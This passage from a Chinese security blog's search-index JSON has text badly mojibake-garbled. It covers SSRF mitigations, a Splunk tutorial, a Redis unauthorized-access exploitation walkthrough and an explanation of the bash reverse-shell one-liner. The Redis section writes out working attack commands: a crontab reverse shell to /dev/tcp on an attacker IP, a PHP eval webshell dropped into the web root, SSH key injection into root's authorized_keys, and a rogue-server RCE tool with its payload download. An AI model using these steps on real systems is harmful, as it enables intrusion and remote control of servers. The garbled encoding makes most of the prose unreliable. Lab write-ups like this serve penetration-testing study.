åº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ GETå‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»ã€‚ åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ã€‚ 1.8 æ¼æ´ä¿®å¤ ç¦æ­¢302è·³è½¬ è¿‡æ»¤è¿”å›ä¿¡æ¯ï¼ŒéªŒè¯è¿œç¨‹æœåŠ¡å™¨å¯¹è¯·æ±‚çš„å“åº”æ˜¯æ¯”è¾ƒå®¹æ˜“çš„æ–¹æ³•ã€‚å¦‚æœwebåº”ç”¨æ˜¯å»è·å–æŸä¸€ç§ç±»å‹çš„æ–‡ä»¶ã€‚é‚£ä¹ˆåœ¨æŠŠè¿”å›ç»“æœå±•ç¤ºç»™ç”¨æˆ·ä¹‹å‰å…ˆéªŒè¯è¿”å›çš„ä¿¡æ¯æ˜¯å¦ç¬¦åˆæ ‡å‡†ã€‚ ç¦ç”¨ä¸éœ€è¦çš„åè®®ï¼Œä»…ä»…å…è®¸httpå’Œhttpsè¯·æ±‚ã€‚å¯ä»¥é˜²æ­¢ç±»ä¼¼äºfile://, gopher://, ftp:// ç­‰å¼•èµ·çš„é—®é¢˜ è®¾ç½®URLç™½åå•æˆ–è€…é™åˆ¶å†…ç½‘IPï¼ˆä½¿ç”¨gethostbyname()åˆ¤æ–­æ˜¯å¦ä¸ºå†…ç½‘IPï¼‰ é™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸ºhttpå¸¸ç”¨çš„ç«¯å£ï¼Œæ¯”å¦‚ 80ã€443ã€8080ã€8090 ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼Œé¿å…ç”¨æˆ·å¯ä»¥æ ¹æ®é”™è¯¯ä¿¡æ¯æ¥åˆ¤æ–­è¿œç«¯æœåŠ¡å™¨çš„ç«¯å£çŠ¶æ€ã€‚ 1.9 å‚è€ƒæ–‡ç«  SSRFå­¦ä¹ ç¬”è®° ssrfæ”»å‡»å†…ç½‘åº”ç”¨ SSRF å­¦ä¹ ç¬”è®° gopher åè®®æ”»å‡»å†…ç½‘ mysql gopher SSRFæ”»å‡»å†…ç½‘åº”ç”¨å¤ç°","categories":[{"name":"WEBå®‰å…¨","slug":"WEBå®‰å…¨","permalink":"http://www.vkxss.top/categories/WEBå®‰å…¨/"}],"tags":[{"name":"WEBæ¸—é€æµ‹è¯•","slug":"WEBæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/WEBæ¸—é€æµ‹è¯•/"}]},{"title":"æ—¥å¿—åˆ†æç¥å™¨_Splunk","slug":"åº”æ€¥-æ—¥å¿—åˆ†æç¥å™¨_Splunk","date":"2019-06-12T07:30:08.000Z","updated":"2019-09-20T02:00:53.772Z","comments":true,"path":"2019/06/12/åº”æ€¥-æ—¥å¿—åˆ†æç¥å™¨_Splunk/","link":"","permalink":"http://www.vkxss.top/2019/06/12/åº”æ€¥-æ—¥å¿—åˆ†æç¥å™¨_Splunk/","excerpt":"","text":"0x01å®‰è£… 0x02æ—¥å¿—åˆ†æ 0x03åˆ†ææ¡ˆä¾‹ 0x03.1 Splunk åè¯è¯´æ˜ 0x03.2 æ¡ˆä¾‹ æ¡ˆä¾‹ä¸€ï¼šç»Ÿè®¡-top 0x01å®‰è£… æ­å»ºç³»ç»Ÿç¯å¢ƒ 16.04.1-Ubuntu-64 Splunk splunk-7.3.0-657388c7a488-Linux-x86_64 ä¸‹è½½è§£å‹ï¼ˆæƒ³è¦å®‰è£…åŒ…è¯·ç•™è¨€ï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š è§£å‹å®Œåï¼Œcdåˆ°splunk/binç›®å½•ä¸‹å¯åŠ¨ï¼Œç„¶åéœ€è¦è¾“å…¥webç™»å½•çš„è´¦æˆ·å’Œå¯†ç ï¼ŒæˆåŠŸå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 1è¿è¡Œå‘½ä»¤:sudo ./splunk start æŸ¥çœ‹è™šæ‹ŸæœºIPï¼Œåœ¨æœ¬åœ°æµè§ˆå™¨è®¿é—®ï¼Œè¾“å…¥è‡ªå·±è®¾ç½®çš„è´¦æˆ·å’Œå¯†ç å³å¯ï¼š 0x02æ—¥å¿—åˆ†æ è½½å…¥éœ€è¦åˆ†æçš„æ—¥å¿—ï¼Œä¸€ç›´ä¸‹ä¸€æ­¥å³å¯ï¼Œæ³¨æ„ä¿®æ”¹ä¸‹ä¸»æœºå­—æ®µå€¼ï¼Œæ–¹ä¾¿æŸ¥æ‰¾ï¼Œæœ€åç‚¹å‡»æäº¤å³å¯ï¼š 0x03åˆ†ææ¡ˆä¾‹0x03.1 Splunk åè¯è¯´æ˜12345678910Data Input : æ·»åŠ æ•°æ® ï¼ˆæ–‡ä»¶æˆ–æ–‡ä»¶ç›®å½•ã€TCPã€UDPã€WMIã€Script, Forwarderâ€¦ï¼‰Source type ï¼š æ¥æºç±»å‹ ï¼ˆapache logs, security logã€network logâ€¦ï¼‰Host ï¼šä¸»æœº ï¼ˆapache1ã€apche2, apcahe3â€¦) Sourceï¼šæ•°æ®æº ï¼ˆ/opt/apache/log/*.*ï¼‰Indexï¼šç´¢å¼•ï¼ˆSplunk ç´¢å¼•ï¼‰Fieldï¼šå­—æ®µï¼š æ­£åˆ™è¡¨è¾¾å¼ (Regular Expression) å–å‡ºç¬¦åˆæŸä¸ªæ¡ä»¶å­—æ®µSearch Languageï¼šæœç´¢è¯­å¥ ï¼ˆç¼©å°èŒƒå›´ -&gt; è®¡ç®— -&gt; å‘ˆç° ï¼‰Saved Searchï¼š æœç´¢è¯­å¥å‚¨å­˜ï¼Œæœªæ¥å¯ä»¥ç›´æ¥ä½¿ç”¨Report ï¼š å ±è¡¨ï¼Œæœç´¢ç»“æœ -&gt; å›¾å½¢æŠ¥è¡¨Alertï¼šå‘Šè­¦ï¼Œæœç´¢ç»“æœé€šæŠ¥ 0x03.2 æ¡ˆä¾‹æ¡ˆä¾‹ä¸€ï¼šç»Ÿè®¡-top åˆ†æçŠ¶æ€ç ä¸º200ã€æ”»å‡»è€…å‰10çš„IPåœ°å€ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š","categories":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"http://www.vkxss.top/categories/åº”æ€¥å“åº”/"}],"tags":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"http://www.vkxss.top/tags/åº”æ€¥å“åº”/"}]},{"title":"Redisæœªæˆæƒè®¿é—®æ¼æ´ä¹‹ubuntuåå¼¹shellé—®é¢˜","slug":"æ¸—é€æµ‹è¯•-Redisæœªæˆæƒè®¿é—®æ¼æ´ä¹‹ubuntuåå¼¹shellé—®é¢˜","date":"2019-05-28T06:25:40.000Z","updated":"2019-12-12T07:56:19.135Z","comments":true,"path":"2019/05/28/æ¸—é€æµ‹è¯•-Redisæœªæˆæƒè®¿é—®æ¼æ´ä¹‹ubuntuåå¼¹shellé—®é¢˜/","link":"","permalink":"http://www.vkxss.top/2019/05/28/æ¸—é€æµ‹è¯•-Redisæœªæˆæƒè®¿é—®æ¼æ´ä¹‹ubuntuåå¼¹shellé—®é¢˜/","excerpt":"","text":"0x00 èƒŒæ™¯ 0x01 ç¯å¢ƒå‡†å¤‡ 0x02 å…·ä½“è¿‡ç¨‹ 0x02.1 å®‰è£…redis 0x02.2 ä¿®æ”¹è¿œç¨‹ç™»é™†é…ç½®æ–‡ä»¶ 0x02.3 æ”»å‡»åˆ©ç”¨ 0x02.4 åˆ©ç”¨è®¡åˆ’ä»»åŠ¡æ‰§è¡Œå‘½ä»¤åå¼¹shell æ‰©å±•æ€è·¯ ä¸‹è½½åæ”¾åˆ° redis-rce ç›®å½•ä¸‹ æ­¤å¤„å¯ä»¥é€šè¿‡ -p å»è®¾ç½®ç›®æ ‡ç«¯å£ï¼ˆé»˜è®¤6379ï¼‰ å‚è€ƒé“¾æ¥ 0x00 èƒŒæ™¯ åœ¨å¤ç°redisæœªæˆæƒè®¿é—®æ¼æ´æ—¶ï¼Œé€šè¿‡å‘linuxä»»åŠ¡è®¡åˆ’æ–‡ä»¶é‡Œå†™åå¼¹shellçš„å‘½ä»¤æ—¶ï¼Œå‘ç°shellå¹¶ä¸èƒ½åå¼¹å›æ¥ï¼Œä¹‹å‰ä½¿ç”¨çš„serverç«¯ä¸ºCentosï¼Œä¸€åˆ‡é¡ºåˆ©å¹¶æ²¡æœ‰å‡ºç°è¿™ç§é—®é¢˜ï¼Œç»“æœè¿™æ¬¡serveræ¢æˆäº†ubuntuï¼Œå°±å‡ºç°ä¸èƒ½åå¼¹çš„é—®é¢˜ã€‚ 0x01 ç¯å¢ƒå‡†å¤‡ ubuntu16.04ï¼Œç”¨æ¥ä»»åŠ¡è®¡åˆ’åå¼¹shellçš„é¶æœº MACï¼Œç”¨æ¥æ¥æ”¶ubuntuåå¼¹è¿‡æ¥çš„shell redis4.0.10æœªæˆæƒè®¿é—®æ¼æ´ 0x02 å…·ä½“è¿‡ç¨‹0x02.1 å®‰è£…redis å®‰è£…ï¼šä¸‹è½½ã€è§£å‹ã€ç¼–è¯‘ 12345$ wget http://download.redis.io/releases/redis-4.0.10.tar.gz$ tar xzf redis-4.0.10.tar.gz$ mv redis-4.0.10 /usr/local/redis$ cd /usr/local/redis$ make åˆ›å»ºæœåŠ¡ï¼šäºŒè¿›åˆ¶æ–‡ä»¶æ˜¯ç¼–è¯‘å®Œæˆååœ¨srcç›®å½•ä¸‹ï¼Œå®¢æˆ·ç«¯æ˜¯/usr/local/redis/src/redis-cliï¼ŒæœåŠ¡å™¨æ˜¯/usr/local/redis/src/redis-serverã€‚ä¸‹é¢ä¸ºè¿™ä¸¤ä¸ªæ–‡ä»¶åšè½¯é“¾æ¥ã€‚ 12$ ln -s /usr/local/redis/src/redis-cli /usr/bin/redis$ ln -s /usr/local/redis/src/redis-server /usr/bin/redisd æµ‹è¯•æ˜¯å¦æˆåŠŸå®‰è£… è‡³æ­¤ï¼Œè¡¨æ˜ä½ çš„rediså·²ç»å®‰è£…å®Œæ¯•ã€‚ 0x02.2 ä¿®æ”¹è¿œç¨‹ç™»é™†é…ç½®æ–‡ä»¶123456789$ vim /usr/local/redis/redis.conf é…ç½®æ–‡ä»¶ bind 127.0.0.1å‰é¢åŠ ä¸Š#å· protected-modeè®¾ä¸ºno $ å¯åŠ¨æœåŠ¡ redisd /usr/local/redis/redis.confæ³¨é‡Šï¼š- å…³é—­protected-modeæ¨¡å¼ï¼Œæ­¤æ—¶å¤–éƒ¨ç½‘ç»œå¯ä»¥ç›´æ¥è®¿é—®- å¼€å¯protected-modeä¿æŠ¤æ¨¡å¼ï¼Œéœ€é…ç½®bind ipæˆ–è€…è®¾ç½®è®¿é—®å¯†ç - redis.confé…ç½®æ–‡ä»¶ä¸­daemonizeå®ˆæŠ¤çº¿ç¨‹ï¼Œé»˜è®¤æ˜¯NO é»˜è®¤çš„é…ç½®æ˜¯ä½¿ç”¨6379ç«¯å£ï¼Œæ²¡æœ‰å¯†ç ã€‚è¿™æ—¶å€™ä¼šå¯¼è‡´æœªæˆæƒè®¿é—®ç„¶åä½¿ç”¨redisæƒé™å†™æ–‡ä»¶ï¼ï¼ 0x02.3 æ”»å‡»åˆ©ç”¨ redisåŸºæœ¬å‘½ä»¤ 123456789101112131415161718192021è¿æ¥redisï¼šredis-cli -h 192.168.1.108æŸ¥çœ‹redisç‰ˆæœ¬ä¿¡æ¯ã€ä¸€äº›å…·ä½“ä¿¡æ¯ã€æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯ç­‰ç­‰ï¼š192.168.1.108:6379&gt;infoå°†å˜é‡xçš„å€¼è®¾ä¸ºtestï¼š192.168.1.108:6379&gt;set x &quot;test&quot;è·å–è®¾ç½®çš„æŸä¸ªå˜é‡çš„å€¼ï¼š192.168.1.108:6379&gt;get x`flushall`æ˜¯æŠŠæ•´ä¸ªredisæ•°æ®åº“åˆ é™¤ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸è¦ç”¨ï¼ï¼ï¼192.168.1.108:6379&gt;flushallæŸ¥çœ‹æ‰€æœ‰é”®ï¼š192.168.1.108:6379&gt;KEYS *è·å–é»˜è®¤çš„redisç›®å½•ã€å’Œrdbæ–‡ä»¶åï¼šå¯ä»¥åœ¨ä¿®æ”¹å‰å…ˆè·å–ï¼Œç„¶åèµ°çš„æ—¶å€™å†æ¢å¤ã€‚192.168.1.108:6379&gt;CONFIG GET dir192.168.1.108:6379&gt;CONFIG GET dbfilename 0x02.4 åˆ©ç”¨è®¡åˆ’ä»»åŠ¡æ‰§è¡Œå‘½ä»¤åå¼¹shell åœ¨redisä»¥rootæƒé™è¿è¡Œæ—¶å¯ä»¥å†™crontabæ¥æ‰§è¡Œå‘½ä»¤åå¼¹shell 1234567891011121314151617å…ˆåœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šç›‘å¬ä¸€ä¸ªç«¯å£nc -lvnp 7999ç„¶åæ‰§è¡Œå‘½ä»¤:root@kali:~# redis-cli -h 192.168.1.108192.168.1.108:6379&gt; set xx &quot;\\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\\n&quot;OK192.168.1.108:6379&gt; config set dir /var/spool/cron/OK192.168.1.108:6379&gt; config set dbfilename rootOK192.168.1.108:6379&gt; saveOK 1234567891011å†æ¬¡ç§‘æ™®ä¸‹ï¼šm:åˆ†é’Ÿ - ä»0åˆ°59çš„æ•´æ•°h:å°æ—¶ - ä»0åˆ°23çš„æ•´æ•°dom:å¤© - ä»1åˆ°31çš„æ•´æ•° (å¿…é¡»æ˜¯æŒ‡å®šæœˆä»½çš„æœ‰æ•ˆæ—¥æœŸ)mon:æœˆ - ä»1åˆ°12çš„æ•´æ•° (æˆ–å¦‚Janæˆ–Febç®€å†™çš„æœˆä»½)dow:å‘¨ä¸€åˆ°å‘¨æ—¥ - ä»0åˆ°7çš„æ•´æ•°ï¼Œ0æˆ–7ç”¨æ¥æè¿°å‘¨æ—¥ (æˆ–ç”¨Sunæˆ–Monç®€å†™æ¥è¡¨ç¤º)user:æŒ‡çš„æ˜¯æ‰§è¡Œå‘½ä»¤çš„ç”¨æˆ·command: éœ€è¦æ‰§è¡Œçš„å‘½ä»¤æ˜Ÿå·(*)è¡¨ç¤ºå‚æ•°æ‰€æœ‰å¯ç”¨çš„å€¼ï¼Œå¦‚æœä¸º5ä¸ª*ï¼Œå°±ä»£è¡¨æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ç¬¦å·â€œ/â€æŒ‡å®šæ­¥è¿›è®¾ç½®ã€‚â€œ/&lt;interger&gt;â€è¡¨ç¤ºæ­¥è¿›å€¼,æ¯”å¦‚*/2 * * * *ä»£è¡¨æ¯ä¸¤åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ä»»åŠ¡ 12345ubuntuä¸‹å¯ä»¥åˆ©ç”¨çš„cronæœ‰ä»¥ä¸‹å‡ ä¸ªåœ°æ–¹ï¼š/etc/crontabï¼šè¯¥æ–‡ä»¶é‡Œé¢çš„ä»»åŠ¡è®¡åˆ’å¯ä»¥ç›´æ¥æ‰§è¡Œ/etc/cron.d/*ï¼šè¯¥ç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶éƒ½å¯ä»¥è¢«å½“ä½œä»»åŠ¡è®¡åˆ’å»æ‰§è¡Œï¼Œå¹¶ä¸”é¿å…äº†åŸå…ˆä»»åŠ¡è®¡åˆ’æ–‡ä»¶è¢«è¦†ç›–çš„æƒ…å†µ/var/spool/cron/crontabs/ï¼šè¯¥ç›®å½•ä¸‹å®šä¹‰çš„ä»»åŠ¡è®¡åˆ’æ–‡ä»¶ä¼šè¢«æ‰§è¡Œï¼Œä¸è¿‡éœ€è¦æœ‰ä¸€ä¸ªå‰æï¼Œå°±æ˜¯è¯¥ä»»åŠ¡è®¡ ç™»é™†ubuntuæŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ï¼Œå·²ç»æˆåŠŸå†™å…¥ã€‚ä½†æ˜¯å‘ç°è®¡åˆ’ä¸­å­˜åœ¨ä¹±ç ï¼Œä¹Ÿå°±æ˜¯è¿™äº›ä¹±ç å¯¼è‡´è®¡åˆ’ä»»åŠ¡æ‰§è¡Œé”™è¯¯ã€‚è¿™æ˜¯ç”±äºrediså‘ä»»åŠ¡è®¡åˆ’æ–‡ä»¶é‡Œå†™å†…å®¹å‡ºç°ä¹±ç è€Œå¯¼è‡´çš„è¯­æ³•é”™è¯¯ï¼Œè€Œä¹±ç æ˜¯é¿å…ä¸äº†çš„ï¼Œcentosä¼šå¿½ç•¥ä¹±ç å»æ‰§è¡Œæ ¼å¼æ­£ç¡®çš„ä»»åŠ¡è®¡åˆ’ï¼Œè€Œubuntuå¹¶ä¸ä¼šå¿½ç•¥è¿™äº›ä¹±ç ï¼Œæ‰€ä»¥å¯¼è‡´å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œå› ä¸ºè‡ªå·±å¦‚æœä¸ä½¿ç”¨rediså†™ä»»åŠ¡è®¡åˆ’æ–‡ä»¶ï¼Œè€Œæ˜¯æ­£å¸¸å‘/etc/cron.dç›®å½•ä¸‹å†™ä»»åŠ¡è®¡åˆ’æ–‡ä»¶çš„è¯ï¼Œå‘½ä»¤æ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œçš„ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¹±ç çš„åŸå› å¯¼è‡´å‘½ä»¤ä¸èƒ½æ­£å¸¸æ‰§è¡Œï¼Œè€Œè¿™ä¸ªé—®é¢˜æ˜¯ä¸èƒ½è§£å†³çš„ï¼Œå› ä¸ºåˆ©ç”¨redisæœªæˆæƒè®¿é—®å†™çš„ä»»åŠ¡è®¡åˆ’æ–‡ä»¶é‡Œéƒ½æœ‰ä¹±ç ï¼Œè¿™äº›ä»£ç æ¥è‡ªredisçš„ç¼“å­˜æ•°æ®ã€‚ â€“ æˆ‘ä»¬æ‰‹åŠ¨æŠŠä¹±ç åˆ é™¤ï¼Œå‘ç°ä¾ç„¶æ— æ³•æˆåŠŸåå¼¹shellã€‚è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ é€šè¿‡è§†é¢‘èµ„æ–™å‘ç°ubantuä¸‹é»˜è®¤ä½¿ç”¨/bin/dashæ‰§è¡Œè„šæœ¬çš„é—®é¢˜ï¼Œè§£å†³æ–¹å¼:å°†shellç¯å¢ƒä¿®æ”¹ä¸ºbashã€‚ æˆåŠŸåå¼¹shell æ‰©å±•æ€è·¯ åˆ©ç”¨Redisæœªæˆæƒè®¿é—®å†™å®šæ—¶ä»»åŠ¡åå¼¹shell åˆ©ç”¨Redisæœªæˆæƒè®¿é—®å†™webshell é€šè¿‡redisæœªæˆæƒè®¿é—®æ¼æ´å‘ubuntuçš„webè·Ÿç›®å½•ä¸‹å†™å…¥ä¸€ä¸ªwebshellï¼Œç„¶åè¦çŸ¥é“ç½‘ç«™çš„æ ¹ç›®å½•ï¼Œåœ¨è¯¥æµ‹è¯•ç¯å¢ƒä¸‹ç½‘ç«™çš„æ ¹ç›®å½•ä¸º/var/www/html 1234set xx &quot;\\n\\n\\&lt;?php @eval($_POST[&apos;test&apos;]);?&gt;\\n\\n&quot;config set dir /var/www/htmlconfig set dbfilename shell.phpsave åˆ©ç”¨redisæœªæˆæƒè®¿é—®å‘è¿œç¨‹æœåŠ¡å™¨å†™å…¥sshå…¬é’¥ 12345678910111213åœ¨æœ¬åœ°ç”Ÿæˆä¸€å¯¹å¯†é’¥ï¼š$ ssh-keygen -t rsaç„¶åå°†å…¬é’¥å†™å…¥ key.txt æ–‡ä»¶$ (echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; key.txtä¹‹ååˆ©ç”¨redisæœªæˆæƒè®¿é—®æ¼æ´å°†å…¬é’¥å†™åˆ°/root/.ssh/id_rsaæ–‡ä»¶ä¸­$ cat key.txt | redis-cli -h ip -x set crackitæ¥ä¸‹æ¥åœ¨redis-cliçš„äº¤äº’å¼shellä¸‹æ‰§è¡Œconfig set dir /root/.sshconfig get dirconfig set dbfilename &quot;authorized_keys&quot;saveè¿™æ ·å°±å¯ä»¥æˆåŠŸçš„å°†è‡ªå·±çš„å…¬é’¥å†™å…¥ /root/.ssh æ–‡ä»¶å¤¹çš„ authotrized_keys æ–‡ä»¶é‡Œï¼Œç„¶åæ”»å‡»è€…ç›´æ¥æ‰§è¡Œ$ ssh â€“i id_rsa root@ip Redis åŸºäºä¸»ä»å¤åˆ¶çš„RCEåˆ©ç”¨æ–¹å¼ https://lorexxar.cn/2019/07/10/redis-5-x-rce/ ä»€ä¹ˆæ˜¯Redisä¸»ä»å¤åˆ¶ Redisæ˜¯ä¸€ä¸ªä½¿ç”¨ANSI Cç¼–å†™çš„å¼€æºã€æ”¯æŒç½‘ç»œã€åŸºäºå†…å­˜ã€å¯é€‰æŒä¹…æ€§çš„é”®å€¼å¯¹å­˜å‚¨æ•°æ®åº“ã€‚ä½†å¦‚æœå½“æŠŠæ•°æ®å­˜å‚¨åœ¨å•ä¸ªRedisçš„å®ä¾‹ä¸­ï¼Œå½“è¯»å†™ä½“é‡æ¯”è¾ƒå¤§çš„æ—¶å€™ï¼ŒæœåŠ¡ç«¯å°±å¾ˆéš¾æ‰¿å—ã€‚ä¸ºäº†åº”å¯¹è¿™ç§æƒ…å†µï¼ŒRediså°±æä¾›äº†ä¸»ä»æ¨¡å¼ï¼Œä¸»ä»æ¨¡å¼å°±æ˜¯æŒ‡ä½¿ç”¨ä¸€ä¸ªrediså®ä¾‹ä½œä¸ºä¸»æœºï¼Œå…¶ä»–å®ä¾‹éƒ½ä½œä¸ºå¤‡ä»½æœºï¼Œå…¶ä¸­ä¸»æœºå’Œä»æœºæ•°æ®ç›¸åŒï¼Œè€Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™ï¼Œé€šè¿‡è¯»å†™åˆ†ç¦»å¯ä»¥å¤§å¹…åº¦å‡è½»æµé‡çš„å‹åŠ›ï¼Œç®—æ˜¯ä¸€ç§é€šè¿‡ç‰ºç‰²ç©ºé—´æ¥æ¢å–æ•ˆç‡çš„ç¼“è§£æ–¹å¼ã€‚ æ¼æ´åˆ©ç”¨ ä¸‹è½½Exp git clone https://github.com/Ridter/redis-rce.git ä¸‹è½½ exp.so ä¸‹è½½åæ”¾åˆ° redis-rce ç›®å½•ä¸‹ wget â€“no-chck-certificate https://github.com/n0b0dyCN/redis-rogue-server/raw/master/exp.so åˆ©ç”¨ æ­¤å¤„å¯ä»¥é€šè¿‡ -p å»è®¾ç½®ç›®æ ‡ç«¯å£ï¼ˆé»˜è®¤6379ï¼‰ python redis-rce.py -r &lt;ç›®æ ‡IP&gt; -L &lt;ç›‘å¬çš„å…¬ç½‘IP&gt; -P &lt;ç›‘å¬çš„å…¬ç½‘ç«¯å£&gt; -f exp.so åˆ©ç”¨redisæœªæˆæƒè®¿é—®è¿œç¨‹å‘½ä»¤æ‰§è¡Œ https://github.com/vkbiu/CVE/tree/master/redis-rce å‚è€ƒé“¾æ¥ https://www.ixigua.com/i6590668394092036612/#mid=1568076190183425 https://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/","categories":[{"name":"WEBå®‰å…¨","slug":"WEBå®‰å…¨","permalink":"http://www.vkxss.top/categories/WEBå®‰å…¨/"}],"tags":[{"name":"WEBæ¸—é€æµ‹è¯•","slug":"WEBæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/WEBæ¸—é€æµ‹è¯•/"}]},{"title":"æ·±å…¥ç†è§£bashåå¼¹shellå‘½ä»¤","slug":"æ¸—é€æµ‹è¯•-æ·±å…¥ç†è§£bashåå¼¹shellå‘½ä»¤","date":"2019-05-20T07:30:08.000Z","updated":"2019-10-11T10:39:53.461Z","comments":true,"path":"2019/05/20/æ¸—é€æµ‹è¯•-æ·±å…¥ç†è§£bashåå¼¹shellå‘½ä»¤/","link":"","permalink":"http://www.vkxss.top/2019/05/20/æ¸—é€æµ‹è¯•-æ·±å…¥ç†è§£bashåå¼¹shellå‘½ä»¤/","excerpt":"","text":"0x00 é¦–å…ˆäº†è§£ä¸‹shell 0x01 bashåå¼¹shell 0x001 å…³äº-i 0x002 å…³äº&gt;&amp; 0x003 å…³äº0&gt;&amp;1 0x004 å…³äº /dev/tcp/host/port 0x00 é¦–å…ˆäº†è§£ä¸‹shell Shell æ˜¯ä¸€ä¸ªç”¨ C è¯­è¨€ç¼–å†™çš„ç¨‹åºï¼Œå®ƒæ˜¯ç”¨æˆ·ä½¿ç”¨ Linux çš„æ¡¥æ¢ã€‚Shell æ—¢æ˜¯ä¸€ç§å‘½ä»¤è¯­è¨€ï¼Œåˆæ˜¯ä¸€ç§ç¨‹åºè®¾è®¡è¯­è¨€ã€‚ ä»¥ä¸‹æ˜¯å‡ ç§shellç‰ˆæœ¬ï¼Œbashæ˜¯é»˜è®¤çš„ï¼š sh(å…¨ç§° Bourne Shell): æ˜¯UNIXæœ€åˆä½¿ç”¨çš„ shellï¼Œè€Œä¸”åœ¨æ¯ç§ UNIX ä¸Šéƒ½å¯ä»¥ä½¿ç”¨ã€‚Bourne Shell åœ¨ shell ç¼–ç¨‹æ–¹é¢ç›¸å½“ä¼˜ç§€ï¼Œä½†åœ¨å¤„ç†ä¸ç”¨æˆ·çš„äº¤äº’æ–¹é¢åšå¾—ä¸å¦‚å…¶ä»–å‡ ç§ shellã€‚bashï¼ˆå…¨ç§° Bourne Again Shellï¼‰: LinuxOS é»˜è®¤çš„ï¼Œå®ƒæ˜¯ Bourne Shell çš„æ‰©å±•ã€‚ä¸ Bourne Shell å®Œå…¨å…¼å®¹ï¼Œå¹¶ä¸”åœ¨ Bourne Shell çš„åŸºç¡€ä¸Šå¢åŠ äº†å¾ˆå¤šç‰¹æ€§ã€‚å¯ä»¥æä¾›å‘½ä»¤è¡¥å…¨ï¼Œå‘½ä»¤ç¼–è¾‘å’Œå‘½ä»¤å†å²ç­‰åŠŸèƒ½ã€‚å®ƒè¿˜åŒ…å«äº†å¾ˆå¤š C Shell å’Œ Korn Shell ä¸­çš„ä¼˜ç‚¹ï¼Œæœ‰çµæ´»å’Œå¼ºå¤§çš„ç¼–è¾‘æ¥å£ï¼ŒåŒæ—¶åˆå¾ˆå‹å¥½çš„ç”¨æˆ·ç•Œé¢ã€‚ csh(å…¨ç§° C Shell): æ˜¯ä¸€ç§æ¯” Bourne Shellæ›´é€‚åˆçš„å˜ç§ Shellï¼Œå®ƒçš„è¯­æ³•ä¸ C è¯­è¨€å¾ˆç›¸ä¼¼ã€‚Tcsh: æ˜¯ Linux æä¾›çš„ C Shell çš„ä¸€ä¸ªæ‰©å±•ç‰ˆæœ¬ã€‚Tcsh åŒ…æ‹¬å‘½ä»¤è¡Œç¼–è¾‘ï¼Œå¯ç¼–ç¨‹å•è¯è¡¥å…¨ï¼Œæ‹¼å†™æ ¡æ­£ï¼Œå†å²å‘½ä»¤æ›¿æ¢ï¼Œä½œä¸šæ§åˆ¶å’Œç±»ä¼¼ C è¯­è¨€çš„è¯­æ³•ï¼Œä»–ä¸ä»…å’Œ Bash Shell æç¤ºç¬¦å…¼å®¹ï¼Œè€Œä¸”è¿˜æä¾›æ¯” Bash Shell æ›´å¤šçš„æç¤ºç¬¦å‚æ•°ã€‚ksh (å…¨ç§° Korn Shell): é›†åˆäº† C Shell å’Œ Bourne Shell çš„ä¼˜ç‚¹å¹¶ä¸”å’Œ Bourne Shell å®Œå…¨å…¼å®¹ã€‚pdksh: æ˜¯ Linux ç³»ç»Ÿæä¾›çš„ ksh çš„æ‰©å±•ã€‚pdksh æ”¯æŒäººç‰©æ§åˆ¶ï¼Œå¯ä»¥åœ¨å‘½ä»¤è¡Œä¸ŠæŒ‚èµ·ï¼Œåå°æ‰§è¡Œï¼Œå”¤é†’æˆ–ç»ˆæ­¢ç¨‹åºã€‚ 0x01 bashåå¼¹shell å¯¹äºbashåå¼¹shellè¿™æ¡å‘½ä»¤ï¼Œç›¸ä¿¡å¾ˆå¤šäººéƒ½å¾ˆç†Ÿæ‚‰äº†: 1/bin/bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;1 ä½†æ˜¯è¿™é‡Œé¢çš„æ¯ä¸ªç»†èŠ‚æ˜¯å¦éƒ½æ¸…æ¥šäº†ï¼Œè¿™å¯å°±ä¸ä¸€å®šäº† 0x001 å…³äº-i 12root@kali:~# man bash | grep -E &quot;\\-i&quot; -i If the -i option is present, the shell is interactive. é¦–å…ˆ -i æ˜¯äº¤äº’çš„æ¨¡å¼ï¼Œä½†æ˜¯å‘ç°å…¶å®ä¸ç”¨-iå‚æ•°ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå› ä¸ºbashå°±æ˜¯å¤„ç†ç”¨æˆ·äº¤äº’çš„ 0x002 å…³äº&gt;&amp; 1234567891011121314151617181920212223242526272829303132root@kali:~# man bash | grep &quot;Redirecting Standard Output and Standard Error&quot; -A 30 Redirecting Standard Output and Standard Error This construct allows both the standard output (file descriptor 1) and the standard error output (file descriptor 2) to be redirected to the file whose name is the expansion of word. There are two formats for redirecting standard output and standard error: &amp;&gt;word and &gt;&amp;word Of the two forms, the first is preferred. This is semantically equivaâ€ lent to &gt;word 2&gt;&amp;1 When using the second form, word may not expand to a number or -. If it does, other redirection operators apply (see Duplicating File Descriptors below) for compatibility reasons. Appending Standard Output and Standard Error This construct allows both the standard output (file descriptor 1) and the standard error output 